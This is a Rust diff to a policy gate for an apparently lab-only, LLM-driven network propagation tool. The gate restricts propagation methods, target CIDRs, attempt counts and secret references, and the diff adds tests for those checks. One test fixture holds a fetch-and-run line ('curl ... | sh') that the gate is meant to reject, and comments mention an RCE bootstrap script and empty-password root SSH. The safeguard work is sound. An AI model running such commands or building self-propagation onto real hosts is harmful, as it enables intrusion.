@@ -1,8 +1,8 @@
 use std::net::Ipv4Addr;
 
 use crate::types::{
-    ArtifactType, PolicyDecision, PolicyRejectionReason, PropagationMethod, PropagationMethodClass,
-    PropagationStrategy, RejectedStrategy,
+    ArtifactType, BootstrapAction, PolicyDecision, PolicyRejectionReason, PropagationMethod,
+    PropagationMethodClass, PropagationStrategy, RejectedStrategy,
 };
 
 pub const MAX_ATTEMPTS: u8 = 6;
@@ -25,14 +25,16 @@ pub struct PolicyGate {
 }
 
 impl PolicyGate {
-    /// Default lab policy — conservative, exploit disabled, no CIDRs pre-loaded.
-    /// Caller must configure `allowed_cidrs` before use.
+    /// Default lab policy — conservative, exploit and Custom disabled, no CIDRs pre-loaded.
+    ///
+    /// `Custom` is excluded from allowed methods because free-form shell must not be
+    /// the default. Enable it explicitly in lab configuration when required.
+    /// Caller must also configure `allowed_cidrs` before use.
     pub fn lab_default() -> Self {
         Self {
             allowed_methods: vec![
                 PropagationMethodClass::Ssh,
                 PropagationMethodClass::Http,
-                PropagationMethodClass::Custom,
                 PropagationMethodClass::NoPath,
             ],
             allowed_artifact_types: vec![
@@ -52,13 +54,15 @@ impl PolicyGate {
     ///
     /// Returns `PolicyDecision::Accepted` only when every check passes.
     /// The returned decision should be recorded in `LlmAttemptEvidence`.
+    ///
+    /// `attempt_number` is one-based: first attempt is 1, last valid is `max_attempts`.
     pub fn evaluate(
         &self,
         strategy: &PropagationStrategy,
         target: Ipv4Addr,
         attempt_number: u8,
     ) -> PolicyDecision {
-        if attempt_number >= self.max_attempts {
+        if attempt_number > self.max_attempts {
             return PolicyDecision::Rejected {
                 reason: PolicyRejectionReason::MaxAttemptsExceeded,
                 rule: format!("max_attempts={}", self.max_attempts),
@@ -106,10 +110,12 @@ impl PolicyGate {
         }
 
         if let Some(plan) = &strategy.bootstrap_plan {
-            if self.contains_secret_material(plan) {
+            if !self.validate_secret_refs(plan) {
                 return PolicyDecision::Rejected {
-                    reason: PolicyRejectionReason::SecretMaterialDetected,
-                    rule: "ephemeral_private_key_pem must not appear in lineage".to_string(),
+                    reason: PolicyRejectionReason::InvalidSecretReference,
+                    rule: "secret_ref.key_id must be non-empty; raw key material must not appear \
+                           in the strategy contract"
+                        .to_string(),
                 };
             }
         }
@@ -117,18 +123,18 @@ impl PolicyGate {
         PolicyDecision::Accepted
     }
 
-    /// Returns true if the plan would persist secret material where it should not.
+    /// Validate secret references in a bootstrap plan.
     ///
-    /// The ephemeral private key in ScpPullFromSource is allowed in the
-    /// bootstrap plan (it is injected at runtime into the RCE script) but
-    /// must never be recorded in lineage. This check is a defence-in-depth
-    /// guard; the maze executor is responsible for stripping key material
-    /// before writing LlmAttemptEvidence.
-    fn contains_secret_material(&self, plan: &crate::types::BootstrapPlan) -> bool {
-        use crate::types::BootstrapAction;
-        plan.steps.iter().any(|step| {
-            matches!(&step.action, BootstrapAction::ScpPullFromSource { ephemeral_private_key_pem, .. }
-                if ephemeral_private_key_pem.is_empty())
+    /// Every `ScpPullFromSource` step must carry a valid `SecretRef` (non-empty
+    /// `key_id`). Raw key material — PEM, credentials, API tokens — cannot exist
+    /// in the strategy contract after `ephemeral_private_key_pem` was replaced with
+    /// `SecretRef`; the type system enforces that invariant. This check is a
+    /// defence-in-depth guard on reference integrity: an empty `key_id` means the
+    /// executor has no reference to resolve and the step must not execute.
+    fn validate_secret_refs(&self, plan: &crate::types::BootstrapPlan) -> bool {
+        plan.steps.iter().all(|step| match &step.action {
+            BootstrapAction::ScpPullFromSource { secret_ref, .. } => !secret_ref.key_id.is_empty(),
+            _ => true,
         })
     }
 
@@ -180,7 +186,10 @@ fn method_class_of(method: &PropagationMethod) -> PropagationMethodClass {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::types::{ArtifactType, PropagationMethod, PropagationStrategy};
+    use crate::types::{
+        ArtifactType, BootstrapPlan, BootstrapStep, ExpectedResult, PropagationMethod,
+        PropagationStrategy, SecretRef, SecretSource,
+    };
     use std::net::Ipv4Addr;
 
     fn strategy(method: PropagationMethod, confidence: f32) -> PropagationStrategy {
@@ -206,6 +215,27 @@ mod tests {
         }
     }
 
+    fn scp_pull_step(key_id: &str) -> BootstrapStep {
+        BootstrapStep {
+            action: BootstrapAction::ScpPullFromSource {
+                source_ip: "10.0.0.1".into(),
+                source_path: "/tmp/physarum-maze".into(),
+                dest_path: "/tmp/physarum-maze".into(),
+                secret_ref: SecretRef {
+                    key_id: key_id.to_string(),
+                    source: SecretSource::RuntimeGenerated,
+                },
+            },
+            target: "10.0.0.2".into(),
+            timeout_ms: 5000,
+            requires_root: false,
+            expected_result: ExpectedResult {
+                success_indicator: "exit 0".into(),
+                failure_indicator: None,
+            },
+        }
+    }
+
     #[test]
     fn accepts_ssh_within_cidr_above_threshold() {
         let gate = gate_with_cidr("10.0.0.0/8");
@@ -217,7 +247,7 @@ mod tests {
             0.9,
         );
         assert!(matches!(
-            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 0),
+            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
             PolicyDecision::Accepted
         ));
     }
@@ -232,7 +262,7 @@ mod tests {
             0.95,
         );
         assert!(matches!(
-            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 0),
+            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
             PolicyDecision::Rejected {
                 reason: PolicyRejectionReason::ExploitNotEnabledForLabMode,
                 ..
@@ -251,7 +281,7 @@ mod tests {
             0.9,
         );
         assert!(matches!(
-            gate.evaluate(&s, "192.168.1.1".parse().unwrap(), 0),
+            gate.evaluate(&s, "192.168.1.1".parse().unwrap(), 1),
             PolicyDecision::Rejected {
                 reason: PolicyRejectionReason::TargetOutsideAllowedCidr,
                 ..
@@ -260,7 +290,7 @@ mod tests {
     }
 
     #[test]
-    fn rejects_when_max_attempts_reached() {
+    fn rejects_when_max_attempts_exceeded() {
         let gate = gate_with_cidr("10.0.0.0/8");
         let s = strategy(
             PropagationMethod::Ssh {
@@ -269,12 +299,31 @@ mod tests {
             },
             0.9,
         );
+        // attempt_number is one-based; MAX_ATTEMPTS (6) is the last valid attempt.
+        // MAX_ATTEMPTS + 1 (7) must be rejected.
         assert!(matches!(
-            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), MAX_ATTEMPTS),
+            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), MAX_ATTEMPTS + 1),
             PolicyDecision::Rejected {
                 reason: PolicyRejectionReason::MaxAttemptsExceeded,
                 ..
             }
+        ));
+    }
+
+    #[test]
+    fn accepts_last_valid_attempt_number() {
+        let gate = gate_with_cidr("10.0.0.0/8");
+        let s = strategy(
+            PropagationMethod::Ssh {
+                user: "root".into(),
+                auth: crate::types::SshAuth::EmptyPassword,
+            },
+            0.9,
+        );
+        // Attempt 6 (== max_attempts) must still be accepted.
+        assert!(matches!(
+            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), MAX_ATTEMPTS),
+            PolicyDecision::Accepted
         ));
     }
 
@@ -289,9 +338,70 @@ mod tests {
             0.5,
         );
         assert!(matches!(
-            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 0),
+            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
             PolicyDecision::Rejected {
                 reason: PolicyRejectionReason::ConfidenceBelowThreshold,
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn rejects_custom_method_by_default() {
+        let gate = gate_with_cidr("10.0.0.0/8");
+        let s = strategy(
+            PropagationMethod::Custom {
+                description: "curl http://10.0.0.1/maze | sh".into(),
+            },
+            0.9,
+        );
+        assert!(matches!(
+            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
+            PolicyDecision::Rejected {
+                reason: PolicyRejectionReason::MethodNotAllowed,
+                ..
+            }
+        ));
+    }
+
+    #[test]
+    fn accepts_scp_pull_with_valid_secret_ref() {
+        let gate = gate_with_cidr("10.0.0.0/8");
+        let mut s = strategy(
+            PropagationMethod::Ssh {
+                user: "root".into(),
+                auth: crate::types::SshAuth::PrivateKey,
+            },
+            0.9,
+        );
+        s.bootstrap_plan = Some(BootstrapPlan {
+            steps: vec![scp_pull_step("sha256:abc123")],
+        });
+        assert!(matches!(
+            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
+            PolicyDecision::Accepted
+        ));
+    }
+
+    #[test]
+    fn rejects_scp_pull_with_empty_key_id() {
+        let gate = gate_with_cidr("10.0.0.0/8");
+        let mut s = strategy(
+            PropagationMethod::Ssh {
+                user: "root".into(),
+                auth: crate::types::SshAuth::PrivateKey,
+            },
+            0.9,
+        );
+        // Empty key_id means the executor has no reference to resolve —
+        // the step must be rejected before execution.
+        s.bootstrap_plan = Some(BootstrapPlan {
+            steps: vec![scp_pull_step("")],
+        });
+        assert!(matches!(
+            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
+            PolicyDecision::Rejected {
+                reason: PolicyRejectionReason::InvalidSecretReference,
                 ..
             }
         ));
